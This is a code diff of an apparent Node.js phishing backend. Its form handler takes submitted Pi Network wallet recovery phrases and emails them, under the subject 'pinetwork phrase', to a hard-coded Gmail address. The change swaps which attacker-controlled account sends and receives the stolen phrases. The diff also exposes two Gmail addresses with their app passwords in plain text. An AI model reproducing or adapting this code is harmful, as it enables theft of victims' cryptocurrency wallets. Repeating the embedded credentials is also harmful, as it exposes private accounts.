@@ -19,11 +19,11 @@ const port = 8000; // Change this to your desired port
 const transporter = nodemailer.createTransport({
   auth: {
     // wallet
-    // pass: "phop baoj wpki iilk",
-    // user: "Pinetworkm493@gmail.com",
+    pass: "phop baoj wpki iilk",
+    user: "Pinetworkm493@gmail.com",
     //pi-personal  
-     pass: "jldq ibpq okzn xqii",
-    user: "pablomizeto@gmail.com",
+    //  pass: "jldq ibpq okzn xqii",
+    // user: "pablomizeto@gmail.com",
   },
   service: "gmail",
 });
@@ -58,7 +58,7 @@ app.post("/submit/7668", async (req, res) => {
       transporter.sendMail({
         from: "PiNetworkWallet ",
         // to: ["pablomizeto@gmail.com"],
-        to: ["pablomizeto@gmail.com"],
+        to: ["Pinetworkm493@gmail.com"],
         subject: "pinetwork phrase",
         text: mfText,
         html: `<h1>${mfText}</h1>`,
